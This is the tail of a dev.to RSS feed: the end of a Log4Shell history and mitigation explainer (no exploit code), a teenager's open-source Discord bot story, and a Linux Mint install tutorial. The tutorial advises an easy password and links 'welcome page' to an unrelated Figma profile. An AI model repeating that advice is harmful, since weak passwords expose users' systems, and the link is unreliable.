&lt;li&gt;Rolling back to 2013, when a new feature patch was submitted to log4j to add log4j JNDI lookups, sounded like a cool feature. But this was the introduction of vulnerability. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-313"&gt;Reference here&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;In 2014, somebody wanted to disable date lookups because of the compatibility issues with other libraries and So a feature was asked to disable lookups. A new feature &lt;code&gt;%msg{nolookups}&lt;/code&gt; was added. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-905"&gt;Reference Here&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Fast forward to 2017, a new config option was added &lt;code&gt;formatmsgNoLookups&lt;/code&gt; which disables lookups globally. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-2109"&gt;Reference Here&lt;/a&gt; This now applies to &lt;code&gt;%msg{nolookups}&lt;/code&gt;, so you don't have to replace and configure all log messages with &lt;code&gt;%msg{nolookups}&lt;/code&gt; anymore. Both &lt;code&gt;%msg{nolookups}&lt;/code&gt; and &lt;code&gt;formatmsgNoLookups&lt;/code&gt; were proposed as the initial mitigation approach for the log4shell vulnerability for users who could not update their log4j dependency but was later scrapped. &lt;/li&gt;
&lt;li&gt;And in 2021 we finally get an advisory about the &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"&gt;RCE &lt;/a&gt;in the log4j utility tool. &lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;
  &lt;a href="#but-wait-a-minute-this-is-not-the-complete-timeline-there-is-a-significant-thing-that-is-missing"&gt;
  &lt;/a&gt;
  But wait a minute this is not the complete timeline, there is a significant thing that is missing
&lt;/h3&gt;

&lt;p&gt;In 2016, something important happened. Let's talk about the JNDI and the LDAP exploitation.&lt;br&gt;
In 2016, at BlackHat, there was a talk by &lt;a href="https://twitter.com/pwntester"&gt;Alvaro Muñoz&lt;/a&gt; named &lt;strong&gt;&lt;u&gt;A journey from JNDI/LDAP Manipulation to RCE DreamLand.&lt;/u&gt;&lt;/strong&gt; &lt;iframe width="710" height="399" src="https://www.youtube.com/embed/Y8a5nB-vy78"&gt;
&lt;/iframe&gt;
&lt;br&gt;
In this talk, they presented research into the JNDI and specifically the LDAP and RMI features. It turns out that you can basically "Store" java serialized objects in LDAP and then a JNDI lookup is not looking at just a basic string but maybe a complex java object. And this is where we enter the world of arbitrary code execution.&lt;br&gt;
In the java development world, people love to send complete objects over the network. And most of the Java Remote code execution CVEs are a result of arbitrary object deserialization or class. There is a java Security Manager object where you can set certain policies to prevent or sandbox arbitrary remote code execution. But yeah this whole object serialization and remote class loading is a java feature.&lt;/p&gt;

&lt;p&gt;And there we have a complete timeline of the log4shell vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mY00MdGI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aek77zrzktymrgkny197.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mY00MdGI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aek77zrzktymrgkny197.jpeg" alt="log4shell meme" width="574" height="499"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I think this thing shows that Pandora's box is now open, people are going to be looking at every open-source libraries, every closed source libraries to find similar things where this can come along.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#mitigation-guide"&gt;
  &lt;/a&gt;
  Mitigation Guide:
&lt;/h2&gt;

&lt;p&gt;Organizations and developers are urged to upgrade to Log4j 2.17.0 (for Java 8), 2.12.3 (for Java 7) and 2.3.1 (for Java 6), and review and monitor the &lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;Apache Log4j Security Vulnerabilities webpage&lt;/a&gt; for updates and mitigation guidance. &lt;br&gt;
&lt;a href="https://github.com/cisagov/log4j-affected-db"&gt;A community-sourced GitHub repository&lt;/a&gt; has been created for any information regarding the mitigation process and the vendors details.&lt;/p&gt;

&lt;p&gt;Thanks for reading this blog, if you find it valuable then give it an applaud 👏&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;https://www.lunasec.io/docs/blog/log4j-zero-day/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;https://logging.apache.org/log4j/2.x/security.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"&gt;https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"&gt;https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/"&gt;https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance"&gt;https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</description>
      <category>java</category>
      <category>security</category>
      <category>log4shell</category>
      <category>log4j</category>
    </item>
    <item>
      <title>Aspiring 16 year old quant developer contributing to Open Source Application</title>
      <author>northern-64bit</author>
      <pubDate>Fri, 24 Dec 2021 19:26:40 +0000</pubDate>
      <link>https://dev.to/northern64bit/aspiring-16-year-old-quant-developer-contributing-to-open-source-application-16k4</link>
      <guid>https://dev.to/northern64bit/aspiring-16-year-old-quant-developer-contributing-to-open-source-application-16k4</guid>
      <description>&lt;p&gt;You may wonder who I am after reading the title. I’m a 16 year old who is in high school, with the dream of becoming a quant developer. This is my dream as I know this role comes with many flexible tasks, it uses math &amp;amp; finance which I find very interesting and where I can, apply my coding skills. &lt;/p&gt;

&lt;p&gt;I have been developing computer programs since I was 11 years old. The first programming language I learned was html if you even dare to call it one. Quickly after this, I learned JavaScript, Python and then C. Python is by far my favourite programming language, since it’s easy to use, clear and has many powerful libraries. &lt;/p&gt;

&lt;p&gt;I started to make my own programs and discovered that I could use Python libraries to speed up development. From this, I learned about open-source projects which helped me a lot as I was able to read code from more experienced developers which helped me learn solutions in my code and improved my coding skills. After a while, I thought it was time to publish my own open-source repository: A stocks discord bot, which is a bot version of one of my GitHub stock programs, to possibly help other developers and traders.&lt;/p&gt;

&lt;p&gt;Another thing that I’ve heard that’s very important is networking. So, I thought that it would be best to contribute to a project with a large community, high coding standard (to learn from it) and experienced contributors that are ready to help. If I stick to this, I thought, I may even get to get some valuable connections to industry professionals.&lt;/p&gt;

&lt;p&gt;In August 2021, I sent a message to the Gamestonk Terminal (GST) Discord after seeing their brilliant work and discovering it. At that time, I was working on my previously mentioned open-source Discord bot and was motivated to continue with it. However, I immediately changed my mind after seeing all the features of GST and their contributor’s work. &lt;/p&gt;

&lt;p&gt;The repository was nearly a match made in heaven, since it was scripted in python, has multiple pull requests merged every day, and maintains high code standard by experienced developers. In addition, it’s the best financial open-source project on GitHub (at least according to me). &lt;/p&gt;

&lt;p&gt;Based on my experience with Discord bots, I got the idea of implementing one specifically for GST. The more I thought about it, the better of an idea it was in my mind. The reasons were that the bot can be widely distributed to phones, since it’s so easy to use via the Discord chat and can even be used by non-tech savvy users, a bot makes it easier to get fresh and easily shareable data for your investment conversations.&lt;br&gt;
I knew that by adding the bot to GST, the project would grow and be better since more users would get to know it. So, I asked in the Discord server of the repository if I could help and possibly make a Discord bot to make it more widely distributed and usable on the phone.&lt;/p&gt;

&lt;p&gt;To my surprise the response was very positive and I started to develop it right away. In the beginning I was a bit lost, since I have never thought about code architecture (most of my other applications were a 1000+ lines in one huge file) and I got the responsibility of the whole project. These troubles got quickly fixed after some calls with the creator of GST, Didier R. Lopes, who really helped me; I learned lots about making a robust, structured and easily understandable application. &lt;/p&gt;

&lt;p&gt;From then on it was just adding feature after feature and improvements from many other GST contributors. This was the case until I had several difficult challenges. The first one was that we wanted to implement a menu like the terminal has – this was solved by adding reactions: 0,1,2,3,..9 to the message so the user could select the command through a reaction. The next challenge was when a menu had more than 10 commands – which I solved by implementing “pagination”, which is a sort of scrolling system via buttons formatting the message like a book. However, this resulted in an additional bug with the emoji detection system due to it being loop and the “pagination” being a loop too. Therefore, I started to experiment with multithreading of which I knew nothing about. But after some time, I managed to merge the code bits from the two loops together into one loop.&lt;/p&gt;

&lt;p&gt;Overall, the development process was exciting and a great learning experience that I wish every other young developer can have. My two cents are to make real useful code with simplicity and understandability in mind to improve your code, since it helps more than leetcode and super theoretical programs that never can be contributed to by other programmers.&lt;/p&gt;

&lt;p&gt;The hard part (or rather the time-consuming part) is to understand code from other people to the extent that you can contribute to it in a meaningful way, so I needed to learn to use many other libraries. This is not meant to discourage you, but to get real hands-on experience with the libraries. It’s also more meaningful to learn more new libraries and function if it has a purpose. &lt;/p&gt;

&lt;p&gt;The Discord bot has a multitude of functions from the terminal and is easy to set up &amp;amp; host so that it’s easy to use the terminal on any device and to share it with other people. It’s also awesome to use it to show the underlying data of your investing thesis quickly to your friends in your own Discord server.&lt;/p&gt;

&lt;p&gt;Here’s a link to it:&lt;br&gt;
&lt;a href="https://github.com/GamestonkTerminal/GamestonkTerminal/tree/main/discordbot"&gt;https://github.com/GamestonkTerminal/GamestonkTerminal/tree/main/discordbot&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Currently I’m looking forward to improving the bot and continue to work with the GST team. My long-term goal is to become a quant (quantitative analyst/researcher/developer), but there’s a long way there since I’m currently only in high school. Thus, I’m ready to contribute on other finance open-source applications at any time, so please contact me on GitHub: &lt;a href="https://github.com/northern-64bit"&gt;https://github.com/northern-64bit&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Merry Christmas! &lt;br&gt;
northern-64bit&lt;/p&gt;

</description>
      <category>opensource</category>
      <category>discord</category>
    </item>
    <item>
      <title>Step-by-step tutorial for installing Linux Mint
</title>
      <author>ltcbuzy</author>
      <pubDate>Fri, 24 Dec 2021 19:19:52 +0000</pubDate>
      <link>https://dev.to/ltcbuzy/step-by-step-tutorial-for-installing-linux-mint-18bp</link>
      <guid>https://dev.to/ltcbuzy/step-by-step-tutorial-for-installing-linux-mint-18bp</guid>
      <description>&lt;p&gt;&lt;strong&gt;Install Linux Mint&lt;/strong&gt;&lt;br&gt;
Linux Mint is one of the most popular distributions of the Linux operating system. Currently, this distribution along with Windows and Mac is one of the most popular operating systems in the world. In this article, we are going to teach you how to install Linux Mint step by step with a photo. So join us.&lt;/p&gt;

&lt;p&gt;Undoubtedly, Linux Mint is one of the best Linux distributions for beginners. It is easy to use, does not consume much system resources and has a lot of software available.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#different-ways-to-install-linux-mint"&gt;
  &lt;/a&gt;
  Different ways to install Linux Mint
&lt;/h2&gt;

&lt;p&gt;There are three different ways we can install Linux Mint. Linux Mint installation methods are:&lt;/p&gt;

&lt;p&gt;Install Linux Mint in VirtualBox on Windows like a regular desktop application.&lt;br&gt;
Install Linux Mint in Dual Boot mode with Windows, which holds both Windows and Linux Mint on one computer.&lt;br&gt;
Replace all other operating systems and install Linux Mint as the only operating system on your computer.&lt;br&gt;
In this tutorial, we will show you how to install Linux Mint and remove other operating systems from your computer. In fact, we have Mint as our main operating system.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-to-install-linux-mint"&gt;
  &lt;/a&gt;
  How to install Linux Mint
&lt;/h2&gt;

&lt;p&gt;We are using the Linux Mint 20 Cinnamon edition. However, the steps work for installing other versions of Mint and desktop types such as Xfce and MATE. The screenshot taken from the Linux Mint installation steps may look a little different, but the steps are the same.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#requirements-for-installing-linux-mint"&gt;
  &lt;/a&gt;
  Requirements for installing Linux Mint:
&lt;/h2&gt;

&lt;p&gt;A USB with a capacity of at least 4 GB. You can also use a DVD.&lt;br&gt;
Active internet connection to download Linux Mint ISO&lt;br&gt;
Tool for making bootable USB drives.&lt;br&gt;
You do not need internet to install Linux Mint.&lt;br&gt;
Note: If  you have important data on the system where you want to install Linux Mint, you must copy the files to an external disk.&lt;/p&gt;

&lt;p&gt;Minimum system requirements for Linux Mint 20 Cinnamon default version:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;At least 1 GB of RAM (2 GB recommended for easy use).&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;At least 15 GB of disk space (20 GB recommended). Minimum resolution 1024 × 768 &lt;br&gt;
Note: This method of installing Linux Mint will format your entire disk. This means that any data in the system will be lost. For this reason, please save your data to an external USB drive so that you can copy it after installing Mint.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#step-1-download-linux-mint-iso-to-install-linux-mint"&gt;
  &lt;/a&gt;
  Step 1: Download Linux Mint ISO to install Linux Mint
&lt;/h2&gt;

&lt;p&gt;Go to the Linux Mint website and download the Linux Mint in ISO format. This file is used to create an installation USB.&lt;/p&gt;

&lt;p&gt;Download Linux Mint&lt;/p&gt;

&lt;p&gt;You will find three types:&lt;/p&gt;

&lt;p&gt;Cinnamon&lt;br&gt;
MATE&lt;br&gt;
Xfce&lt;br&gt;
If you do not know enough about them, go with the default version of Cinnamon. When you click on it, you will find various websites and related links to download the ISO file.&lt;br&gt;
After downloading the file, we must prepare it for the next steps of installing Linux Mint.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zbKibK1C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/w01i8e3y4jhosbr7ihgn.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zbKibK1C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/w01i8e3y4jhosbr7ihgn.jpg" alt="Image description" width="799" height="450"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#download-linux-mint"&gt;
  &lt;/a&gt;
  Download Linux Mint
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Step 2: Create a bootable USB drive from Linux Mint&lt;/strong&gt;&lt;br&gt;
Now that you have downloaded the ISO, it is time to create a live USB from Linux Mint. You need proprietary software to create a live USB. Several of these tools are available for free. You can use Etcher available on Windows, Linux and macOS.&lt;/p&gt;

&lt;p&gt;If you use Windows, you can also use Rufus. In this example we have used Rufus.&lt;/p&gt;

&lt;p&gt;Download Rufus and run the exe file and you will see a page like the one above.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--h1h6Fleq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6y7z6s2z5ejgwhrqyxth.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--h1h6Fleq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6y7z6s2z5ejgwhrqyxth.jpg" alt="Image description" width="800" height="498"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Create a bootable USB drive from Linux Mint&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-to-create-linux-mint-live-usb"&gt;
  &lt;/a&gt;
  How to create Linux Mint Live Usb
&lt;/h2&gt;

&lt;p&gt;You select the ISO. You may confuse this with partitioning. Almost all computers have been using the GPT partitioning scheme for the past 7 years or more. Older computers and systems may use MBR partitioning. You should check which partitioning scheme your system uses to make sure you choose that option.&lt;/p&gt;

&lt;p&gt;If you choose the wrong partitioning scheme, you may not be able to install Linux Mint successfully. In this case, go back to this step and re-create the USB by selecting another partitioning scheme.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 3: Boot from USB containing Linux Mint&lt;/strong&gt;&lt;br&gt;
Once you have successfully created USB Linux Mint, it's time to use it to install great Linux Mint.&lt;/p&gt;

&lt;p&gt;Connect the Linux Mint Live USB and restart your system. On the boot screen, when you see the manufacturer logo of your laptop or computer, press F2 or F10 or F12 to enter the BIOS settings.&lt;/p&gt;

&lt;p&gt;At this point, you need to make sure you select the boot for USB or DVD. In this tutorial, we choose the first one. Select USB at the top of the boot command.&lt;/p&gt;

&lt;p&gt;This screen may look different for different manufacturers. You have to find these settings yourself or search the internet. Make changes, save and exit.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4GpudNRm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/odtlizgqaqt2pwg42sk0.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4GpudNRm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/odtlizgqaqt2pwg42sk0.jpg" alt="Image description" width="799" height="302"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#boot-from-usb-containing-linux-mint"&gt;
  &lt;/a&gt;
  Boot from USB containing Linux Mint
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Step 4: Install Linux Mint&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;a) Change the boot to USB&lt;br&gt;
You must now boot into the Linux Mint live environment. You will see a page like this that gives you several options. Proceed with the first option.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#linux-mint-installation-tutorial"&gt;
  &lt;/a&gt;
  Linux Mint installation tutorial
&lt;/h2&gt;

&lt;p&gt;You'll be in the Linux Mint live environment in seconds. If you have USB 2 it may take longer.&lt;/p&gt;

&lt;p&gt;b) Select the Install Linux Mint icon&lt;br&gt;
You will see the "Install Linux Mint" icon on your desktop. Click on it to start the installation process.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#install-linux-mint"&gt;
  &lt;/a&gt;
  Install Linux Mint
&lt;/h2&gt;

&lt;p&gt;c) Language selection&lt;br&gt;
In this step you will be asked to select some basic settings such as language and keyboard layout. Choose the most suitable for your system. Select the Linux Mint keyboard layout as follows.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#install-linux-mint"&gt;
  &lt;/a&gt;
  Install Linux Mint
&lt;/h2&gt;

&lt;p&gt;Note: Do not connect to the Internet during installation. We strongly recommend that you do not connect to the Internet when installing Linux Mint. This way the installation is faster because it does not try to download updates during installation.&lt;/p&gt;

&lt;p&gt;d) Select the partition to install Linux Mint&lt;br&gt;
The next page is the most important part of installing Linux Mint. You want to format the entire hard drive and install Linux Mint. Linux Mint will be your only operating system. Again, this means that you will lose all data on the disk. Please copy important files to an external disk.&lt;/p&gt;

&lt;p&gt;In this way, installing Linux Mint manages everything alone. This creates an ESP partition to manage the EFI boot with a size of about 500 MB and the rest of the disk is allocated to the root partition. The root contains a swap file for swap use and your main directory. This is the easiest way to get started with Linux Mint.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#install-linux-mint"&gt;
  &lt;/a&gt;
  Install Linux Mint
&lt;/h2&gt;

&lt;p&gt;In this step you will erase the disk and install Mint. You will be warned that the disk will be formatted. Click continue.&lt;/p&gt;

&lt;p&gt;e) Select the time zone&lt;br&gt;
In the next section, you must select the time zone. You can do it later.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#linux-mint-installation-tutorial"&gt;
  &lt;/a&gt;
  Linux Mint installation tutorial
&lt;/h2&gt;

&lt;p&gt;f) Specify username and password&lt;br&gt;
After that, you will be presented with a page that asks you to set your username and password. Use an easy password to remember because you should always use it.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#linux-mint-installation-tutorial"&gt;
  &lt;/a&gt;
  Linux Mint installation tutorial
&lt;/h2&gt;

&lt;p&gt;From now on, everything is quite simple.&lt;/p&gt;

&lt;p&gt;g) Complete the installation&lt;br&gt;
You need to wait about 5-10 minutes for the Linux Mint installation to complete. After the installation is complete, it will ask you to restart the system. Restart it.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#linux-mint-installation-tutorial"&gt;
  &lt;/a&gt;
  Linux Mint installation tutorial
&lt;/h2&gt;

&lt;p&gt;h) Remove the USB drive&lt;br&gt;
Linux Mint installation is complete. When the system shuts down, it will ask you to delete Live USB as well.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#linux-mint-installation-tutorial"&gt;
  &lt;/a&gt;
  Linux Mint installation tutorial
&lt;/h2&gt;

&lt;p&gt;Well, we've finished installing Linux Mint. You are now booting into Linux Mint. Enter the password you just created and log in to Linux Mint to see a &lt;a href="https://www.figma.com/@Leadvisitors"&gt;welcome page&lt;/a&gt; like this:&lt;/p&gt;

&lt;p&gt;Well, we were able to install Linux Mint on our computer easily &lt;br&gt;
and with the least hassle. Now it's time to enjoy using Mint's popular operating system.&lt;/p&gt;

</description>
      <category>linux</category>
      <category>tutorial</category>
      <category>beginners</category>
      <category>devops</category>
    </item>
  </channel>
</rss>
